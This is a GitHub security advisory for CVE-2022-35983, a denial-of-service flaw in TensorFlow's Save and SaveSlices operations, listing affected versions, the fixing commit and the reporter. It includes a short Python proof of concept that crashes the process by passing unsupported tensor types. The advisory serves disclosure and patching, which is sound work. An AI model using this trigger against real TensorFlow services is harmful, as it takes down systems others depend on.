# [M] TensorFlow vulnerable to `CHECK` fail in `Save` and `SaveSlices`

## Summary
Severity: Medium
Advisory: GHSA-m6vp-8q9j-whx4
CVE: CVE-2022-35983
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-m6vp-8q9j-whx4
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `Save` or `SaveSlices` is run over tensors of an unsupported `dtype`, it results in a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
```

### Patches
We have patched the issue in GitHub commit [5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4](https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4
- https://nvd.nist.gov/vuln/detail/CVE-2022-35983
- https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
